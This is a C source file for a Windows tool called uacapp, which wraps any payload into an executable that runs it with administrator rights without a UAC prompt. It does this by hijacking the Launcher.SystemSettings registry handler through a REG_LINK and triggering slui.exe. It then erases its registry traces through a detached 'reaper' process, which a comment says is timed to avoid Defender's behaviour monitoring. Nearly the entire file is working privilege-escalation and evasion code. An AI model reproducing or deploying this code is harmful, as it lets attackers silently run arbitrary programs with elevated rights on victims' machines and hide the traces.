#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <objbase.h>
#include <sddl.h>
#include <stdio.h>

/*
 * uacapp - self-extracting UAC-bypass locker (Method 61 family).
 *
 * Mode 1 (generator):  uacapp.exe <payload> [out.exe]
 *   Makes a copy of itself, appends the payload plus a trailer
 *   {magic, offset, length, ext}, producing the "converted" app.
 *
 * Mode 2 (runtime):    the converted app runs -> extracts payload to
 *   %TEMP%\uacapp_<pid>\, plants the Launcher.SystemSettings REG_LINK
 *   scheme, triggers slui.exe (auto-elevate, no prompt), payload runs
 *   High, then the registry scheme is fully removed.
 */

#define TRAILER_MAGIC1 "OPENCODE_UACAPP1"  /* 16 chars exactly */
#define TRAILER_MAGIC2 "OPENCODE_UACAPP2"  /* 16 chars exactly */

typedef struct {
    BYTE  magic1[16];
    ULONGLONG offset;
    ULONGLONG length;
    WCHAR  ext[32];
    BYTE  magic2[16];
} TRAILER; /* 80 bytes */

static const TRAILER ZERO_TRAILER = {
    {0}, 0, 0, L"", {0}
};

static int WritePayloadCopy(LPCWSTR selfPath, LPCWSTR outPath, LPCWSTR payloadPath)
{
    HANDLE hIn = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return 2;
    HANDLE hOut = CreateFileW(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hIn); return 2; }

    BYTE buf[1 << 16];
    DWORD rd, wr;
    ULONGLONG baseLen = 0;
    while (ReadFile(hIn, buf, sizeof(buf), &rd, NULL) && rd > 0) {
        WriteFile(hOut, buf, rd, &wr, NULL);
        baseLen += rd;
    }
    CloseHandle(hIn);

    HANDLE hP = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hP == INVALID_HANDLE_VALUE) { CloseHandle(hOut); DeleteFileW(outPath); return 2; }
    ULONGLONG payloadLen = 0;
    while (ReadFile(hP, buf, sizeof(buf), &rd, NULL) && rd > 0) {
        WriteFile(hOut, buf, rd, &wr, NULL);
        payloadLen += rd;
    }
    CloseHandle(hP);

    TRAILER t = ZERO_TRAILER;
    memcpy(t.magic1, TRAILER_MAGIC1, 16);
    memcpy(t.magic2, TRAILER_MAGIC2, 16);
    t.offset = baseLen;
    t.length = payloadLen;
    const wchar_t* dot = wcsrchr(payloadPath, L'.');
    if (dot) wcsncpy_s(t.ext, 32, dot + 1, _TRUNCATE);
    WriteFile(hOut, &t, sizeof(t), &wr, NULL);
    CloseHandle(hOut);
    return 0;
}

static BOOL ReadTrailer(LPCWSTR selfPath, TRAILER* t, ULONGLONG* fileLen)
{
    HANDLE h = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    LARGE_INTEGER li;
    GetFileSizeEx(h, &li);
    *fileLen = (ULONGLONG)li.QuadPart;
    if (*fileLen <= sizeof(TRAILER)) { CloseHandle(h); return FALSE; }
    LARGE_INTEGER pos;
    pos.QuadPart = (LONGLONG)(*fileLen - sizeof(TRAILER));
    SetFilePointerEx(h, pos, NULL, FILE_BEGIN);
    DWORD rd = 0;
    BOOL ok = ReadFile(h, t, sizeof(TRAILER), &rd, NULL) && rd == sizeof(TRAILER);
    CloseHandle(h);
    if (!ok) return FALSE;
    if (memcmp(t->magic1, TRAILER_MAGIC1, 16) != 0) return FALSE;
    if (memcmp(t->magic2, TRAILER_MAGIC2, 16) != 0) return FALSE;
    return TRUE;
}

static HKEY OpenClasses(void)
{
    HKEY k = NULL;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes", 0, KEY_CREATE_SUB_KEY | KEY_READ, &k) == ERROR_SUCCESS)
        return k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes", 0, NULL, 0, KEY_CREATE_SUB_KEY | KEY_READ, NULL, &k, NULL) == ERROR_SUCCESS)
        return k;
    return NULL;
}

static NTSTATUS CreateSlaveKey(HKEY classes, LPCWSTR payloadCmd, LPWSTR guidOut /* {GUID} */)
{
    GUID g;
    if (CoCreateGuid(&g) != S_OK) return -1;
    OLECHAR* str = NULL;
    if (StringFromCLSID(&g, &str) != S_OK) return -1;
    wcscpy_s(guidOut, 64, str);
    CoTaskMemFree(str);

    HKEY hk = NULL;
    if (RegCreateKeyExW(classes, guidOut, 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) != ERROR_SUCCESS)
        return -1;
    DWORD dummy = 0;
    RegSetValueExW(hk, L"DelegateExecute", 0, REG_SZ, (const BYTE*)&dummy, 0);
    RegSetValueExW(hk, NULL, 0, REG_SZ, (const BYTE*)payloadCmd, (DWORD)((wcslen(payloadCmd) + 1) * sizeof(WCHAR)));
    RegCloseKey(hk);
    return 0;
}

/* Mirrors UACME supRemoveRegLinkHKCU */
static void LogStatus(const wchar_t* msg);

static NTSTATUS RemoveRegLink(LPCWSTR ntPath)
{
    NTSTATUS (NTAPI *pOpen)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    NTSTATUS (NTAPI *pDelVal)(HANDLE, PUNICODE_STRING);
    NTSTATUS (NTAPI *pDelKey)(HANDLE);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pOpen = (NTSTATUS (NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES))GetProcAddress(ntdll, "NtOpenKey");
    pDelVal = (NTSTATUS (NTAPI*)(HANDLE,PUNICODE_STRING))GetProcAddress(ntdll, "NtDeleteValueKey");
    pDelKey = (NTSTATUS (NTAPI*)(HANDLE))GetProcAddress(ntdll, "NtDeleteKey");

    UNICODE_STRING us; 
    us.Buffer = (PWSTR)ntPath;
    us.Length = (USHORT)(wcslen(ntPath) * 2);
    us.MaximumLength = us.Length + 2;
    OBJECT_ATTRIBUTES oa;
    RtlZeroMemory(&oa, sizeof(oa));
    oa.Length = sizeof(oa);
    oa.ObjectName = &us;
    oa.Attributes = OBJ_CASE_INSENSITIVE | OBJ_OPENLINK;

    HANDLE hKey = NULL;
    NTSTATUS st = pOpen(&hKey, KEY_ALL_ACCESS, &oa);
    if (!NT_SUCCESS(st)) return st;
    UNICODE_STRING usVal; usVal.Buffer = L"SymbolicLinkValue"; usVal.Length = (USHORT)(wcslen(usVal.Buffer)*2); usVal.MaximumLength = usVal.Length + 2;
    if (NT_SUCCESS(pDelVal(hKey, &usVal)))
        st = pDelKey(hKey);
    else
        st = pDelKey(hKey);
    NtClose(hKey);
    return st;
}

static int RunPayload(HKEY classes, LPCWSTR payloadCmd, LPCWSTR slaveGuid, LPCWSTR sid)
{
    /* master: Software\Classes\Launcher.SystemSettings\shell\open (normal key) */
    HKEY masterRoot = NULL;
    if (RegCreateKeyExW(classes, L"Launcher.SystemSettings\\shell\\open", 0, NULL, 0, KEY_CREATE_SUB_KEY | KEY_WRITE, NULL, &masterRoot, NULL) != ERROR_SUCCESS)
        return 3;

    /* child "command" created as a volatile REG_LINK */
    NTSTATUS (NTAPI *pCreate)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
    NTSTATUS (NTAPI *pSetVal)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pCreate = (NTSTATUS (NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,ULONG,PUNICODE_STRING,ULONG,PULONG))GetProcAddress(ntdll, "NtCreateKey");
    pSetVal = (NTSTATUS (NTAPI*)(HANDLE,PUNICODE_STRING,ULONG,ULONG,PVOID,ULONG))GetProcAddress(ntdll, "NtSetValueKey");

    UNICODE_STRING usCmd; usCmd.Buffer = L"command"; usCmd.Length = (USHORT)(wcslen(usCmd.Buffer)*2); usCmd.MaximumLength = usCmd.Length + 2;
    OBJECT_ATTRIBUTES oa;
    RtlZeroMemory(&oa, sizeof(oa));
    oa.Length = sizeof(oa);
    oa.RootDirectory = masterRoot;
    oa.ObjectName = &usCmd;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE hLink = NULL;
    ULONG disp = 0;
    NTSTATUS st = pCreate(&hLink, KEY_ALL_ACCESS, &oa, 0, NULL, REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE, &disp);
    if (st == STATUS_OBJECT_NAME_COLLISION) {
        oa.Attributes |= OBJ_OPENLINK;
        NTSTATUS (NTAPI *pOpen)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
        pOpen = (NTSTATUS (NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES))GetProcAddress(ntdll, "NtOpenKey");
        st = pOpen(&hLink, KEY_ALL_ACCESS, &oa);
    }
    if (NT_SUCCESS(st)) {
        /* slave nt path: \REGISTRY\USER\SID\Software\Classes\{GUID} */
        WCHAR slaveNt[MAX_PATH];
        wsprintfW(slaveNt, L"\\REGISTRY\\USER\\%s\\Software\\Classes\\%s", sid, slaveGuid);
        UNICODE_STRING usSlave;
        usSlave.Buffer = slaveNt;
        usSlave.Length = (USHORT)(wcslen(slaveNt) * 2);
        usSlave.MaximumLength = usSlave.Length + 2;
        UNICODE_STRING usSym; usSym.Buffer = L"SymbolicLinkValue"; usSym.Length = (USHORT)(wcslen(usSym.Buffer)*2); usSym.MaximumLength = usSym.Length + 2;
        st = pSetVal(hLink, &usSym, 0, REG_LINK, slaveNt, usSlave.Length);
        NtClose(hLink);
    }
    RegCloseKey(masterRoot);
    if (!NT_SUCCESS(st)) return 4;

    /* trigger: slui.exe with runas verb -> auto-elevate, no prompt */
    WCHAR slui[MAX_PATH];
    wsprintfW(slui, L"%s\\slui.exe", L"C:\\Windows\\System32");
    SHELLEXECUTEINFOW sei;
    RtlZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = slui;
    sei.nShow = SW_SHOWNORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    BOOL ok = ShellExecuteExW(&sei);
    LogStatus(L"ShellExecuteEx done");
    if (sei.hProcess) CloseHandle(sei.hProcess);
    return ok ? 0 : 5;
}

static void CleanupAll(HKEY classes, LPCWSTR slaveGuid, LPCWSTR sid)
{
    /* sweep any orphan {GUID} slave keys from earlier runs (contain DelegateExecute + default payload) */
    WCHAR sub[512];
    DWORD subLen = 512;
    DWORD idx = 0;
    for (;;) {
        subLen = 512;
        if (RegEnumKeyExW(classes, idx, sub, &subLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        if (sub[0] == L'{' && subLen >= 10) {
            HKEY hk = NULL;
            if (RegOpenKeyExW(classes, sub, 0, KEY_QUERY_VALUE, &hk) == ERROR_SUCCESS) {
                DWORD type = 0;
                WCHAR def[512];
                DWORD defLen = sizeof(def);
                LONG r = RegQueryValueExW(hk, L"DelegateExecute", NULL, &type, NULL, NULL);
                if (r == ERROR_SUCCESS && type == REG_SZ) {
                    r = RegQueryValueExW(hk, NULL, NULL, NULL, (LPBYTE)def, &defLen);
                    if (r == ERROR_SUCCESS && wcsstr(def, L"uacapp_") != NULL) {
                        RegCloseKey(hk);
                        RegDeleteKeyW(classes, sub);
                        continue; /* index stays for next */
                    }
                }
                RegCloseKey(hk);
            }
        }
        idx++;
    }

    if (classes && slaveGuid && slaveGuid[0])
        RegDeleteKeyW(classes, slaveGuid);
    WCHAR masterLink[MAX_PATH];
    wsprintfW(masterLink, L"\\REGISTRY\\USER\\%s\\Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command", sid);
    RemoveRegLink(masterLink);
    if (classes)
        RegDeleteTreeW(classes, L"Launcher.SystemSettings");
}

static void LogStatus(const wchar_t* msg)
{
    HANDLE h = CreateFileW(L"C:\\Windows\\Temp\\opencode\\uacapp_status.log", GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    DWORD n;
    wchar_t line[1024];
    wsprintfW(line, L"[%lu] %s\n", GetCurrentProcessId(), msg);
    WriteFile(h, line, (DWORD)(wcslen(line) * 2), &n, NULL);
    CloseHandle(h);
}

static void GetSid(wchar_t* out, DWORD outCch)
{
    HANDLE hTok = NULL;
    out[0] = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) return;
    DWORD len = 0;
    GetTokenInformation(hTok, TokenUser, NULL, 0, &len);
    if (len == 0) { CloseHandle(hTok); return; }
    TOKEN_USER* tu = (TOKEN_USER*)malloc(len);
    if (tu && GetTokenInformation(hTok, TokenUser, tu, len, &len)) {
        wchar_t* s = NULL;
        if (ConvertSidToStringSidW(tu->User.Sid, &s)) {
            wcsncpy_s(out, outCch, s, _TRUNCATE);
            LocalFree(s);
        }
    }
    free(tu);
    CloseHandle(hTok);
}

static void ExtractPayload(LPCWSTR selfPath, const TRAILER* t, wchar_t* outPath, DWORD outCch)
{
    WCHAR dir[MAX_PATH];
    GetTempPathW(MAX_PATH, dir);
    wsprintfW(dir + wcslen(dir), L"uacapp_%lu", GetCurrentProcessId());
    CreateDirectoryW(dir, NULL);

    HANDLE hIn = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    LARGE_INTEGER pos;
    pos.QuadPart = (LONGLONG)t->offset;
    SetFilePointerEx(hIn, pos, NULL, FILE_BEGIN);
    HANDLE hOut = CreateFileW(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    BYTE buf[1 << 16];
    ULONGLONG remain = t->length;
    DWORD rd, wr;
    while (remain > 0) {
        DWORD want = (DWORD)((remain > sizeof(buf)) ? sizeof(buf) : remain);
        if (!ReadFile(hIn, buf, want, &rd, NULL) || rd == 0) break;
        WriteFile(hOut, buf, rd, &wr, NULL);
        remain -= rd;
    }
    CloseHandle(hOut);
    CloseHandle(hIn);
}

int wmain(int argc, wchar_t** argv)
{
    SetUnhandledExceptionFilter(NULL);
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    LogStatus(L"wmain entry");

    if (argc == 6 && _wcsicmp(argv[1], L"--reaper") == 0) {
        /* detached cleanup helper: --reaper <guid> <sid> <tempdir> <pid> */
        LogStatus(L"reaper start");
        Sleep(6000);
        HKEY classes = OpenClasses();
        if (classes) {
            CleanupAll(classes, argv[2], argv[3]);
            RegCloseKey(classes);
        }
        WCHAR rmd[MAX_PATH];
        wsprintfW(rmd, L"%s\\uacapp_%s", argv[4], argv[5]);
        for (int attempt = 0; attempt < 30; attempt++) {
            Sleep(1000);
            HANDLE hFind;
            WIN32_FIND_DATAW fd;
            WCHAR pat[MAX_PATH];
            wsprintfW(pat, L"%s\\uacapp_%s\\*", argv[4], argv[5]);
            BOOL any = FALSE;
            hFind = FindFirstFileW(pat, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                any = TRUE;
                do {
                    WCHAR f[MAX_PATH];
                    wsprintfW(f, L"%s\\uacapp_%s\\%s", argv[4], argv[5], fd.cFileName);
                    DeleteFileW(f);
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            if (RemoveDirectoryW(rmd))
                break;
            if (!any) break;
        }
        LogStatus(L"reaper done");
        CoUninitialize();
        return 0;
    }

    WCHAR self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);

    TRAILER t;
    ULONGLONG fileLen = 0;

    if (argc >= 2 && argc <= 3 && !ReadTrailer(self, &t, &fileLen)) {
        /* generator mode */
        if (argc < 2) {
            wprintf(L"usage 1: %s <payload> [out.exe]\n", argv[0]);
            wprintf(L"usage 2: <converted.exe>  (runs payload elevated, no UAC prompt)\n");
            CoUninitialize();
            return 1;
        }
        WCHAR outPath[MAX_PATH];
        if (argc == 3) {
            wcscpy_s(outPath, MAX_PATH, argv[2]);
        } else {
            const wchar_t* dot = wcsrchr(argv[1], L'.');
            size_t base = dot ? (size_t)(dot - argv[1]) : wcslen(argv[1]);
            wcsncpy_s(outPath, MAX_PATH, argv[1], base);
            wcscat_s(outPath, MAX_PATH, L"_uac.exe");
        }
        int rc = WritePayloadCopy(self, outPath, argv[1]);
        wprintf(rc == 0 ? L"[+] converted: %s\n" : L"[-] failed\n", outPath);
        CoUninitialize();
        return rc;
    }

    if (!ReadTrailer(self, &t, &fileLen)) {
        wprintf(L"[-] no payload embedded\n");
        CoUninitialize();
        return 1;
    }

    /* runtime mode */
    WCHAR sid[128];
    GetSid(sid, 128);
    if (sid[0] == 0) { LogStatus(L"sid fail"); wprintf(L"[-] sid fail\n"); CoUninitialize(); return 1; }
    LogStatus(L"runtime start");

    /* command string per extension */
    WCHAR dir[MAX_PATH], payloadPath[MAX_PATH];
    GetTempPathW(MAX_PATH, dir);
    wcscpy_s(payloadPath, MAX_PATH, dir);
    wcscat_s(payloadPath, MAX_PATH, L"uacapp_");
    WCHAR pidStr[16];
    wsprintfW(pidStr, L"%lu", GetCurrentProcessId());
    wcscat_s(payloadPath, MAX_PATH, pidStr);
    CreateDirectoryW(payloadPath, NULL);
    wcscat_s(payloadPath, MAX_PATH, L"\\p.");
    wcscat_s(payloadPath, MAX_PATH, t.ext);

    ExtractPayload(self, &t, payloadPath, MAX_PATH);

    WCHAR cmd[MAX_PATH * 2];
    if (_wcsicmp(t.ext, L"bat") == 0 || _wcsicmp(t.ext, L"cmd") == 0) {
        wsprintfW(cmd, L"cmd.exe /c \"\"%s\"\"", payloadPath);
    } else if (_wcsicmp(t.ext, L"ps1") == 0) {
        wsprintfW(cmd, L"powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%s\"", payloadPath);
    } else if (_wcsicmp(t.ext, L"vbs") == 0) {
        wsprintfW(cmd, L"cscript.exe //nologo \"%s\"", payloadPath);
    } else if (_wcsicmp(t.ext, L"msi") == 0) {
        wsprintfW(cmd, L"msiexec.exe /i \"%s\"", payloadPath);
    } else {
        wsprintfW(cmd, L"\"%s\"", payloadPath);
    }

    HKEY classes = OpenClasses();
    WCHAR guid[64];
    guid[0] = 0;
    int rc = 0;
    if (classes) {
        if (CreateSlaveKey(classes, cmd, guid) == 0) {
            LogStatus(L"slave created");
            rc = RunPayload(classes, cmd, guid, sid);
            LogStatus(L"run done");
        }
        RegCloseKey(classes);
    } else {
        rc = 3;
        LogStatus(L"classes open fail");
    }

    /* hand off cleanup to a detached reaper child: the wrapper must exit fast
       (Defender behavior-watch kills long-lived trigger processes), while the
       payload needs a spawn window (registry + extracted file kept until the
       reaper wakes and cleans up) */
    WCHAR dirStripped[MAX_PATH];
    wcscpy_s(dirStripped, MAX_PATH, dir);
    size_t dlen = wcslen(dirStripped);
    if (dlen > 0 && dirStripped[dlen - 1] == L'\\') dirStripped[dlen - 1] = 0;
    WCHAR cmdline[MAX_PATH * 2];
    wsprintfW(cmdline, L"\"%s\" --reaper %s %s %s %lu", self, guid, sid, dirStripped, GetCurrentProcessId());
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    if (CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        LogStatus(L"reaper spawned");
    } else {
        LogStatus(L"reaper spawn fail");
    }

    wprintf(L"rc=%d\n", rc);
    LogStatus(L"exit");
    CoUninitialize();
    return rc;
}